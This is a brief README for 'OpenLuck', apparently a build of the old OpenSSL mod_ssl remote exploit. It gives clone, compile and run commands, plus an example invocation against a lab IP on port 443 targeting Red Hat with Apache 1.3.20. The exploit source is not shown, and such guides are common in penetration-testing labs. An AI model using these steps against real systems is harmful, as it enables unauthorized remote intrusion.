# OpenLuck

## Usage

1. Download OpenLuck.c
```
git clone https://github.com/anwarbil/Lucky.git
```
2. Install ssl-dev library

```
apt-get install libssl-dev
```

3. It's Compile Time

````
gcc -o Open OpenLuck.c -lcrypto
````

4. Running the Exploit
```
./Open
```

5. See which service you witch to exploit. For example if you need to Red Hat Linux, using apache version 1.3.20. Trying out using the 0x6a option
./OpenFuck 0x6a [Target Ip] [port] -c 40

for example:
```
./Open 0x6a 192.168.80.145 443 -c 40
```

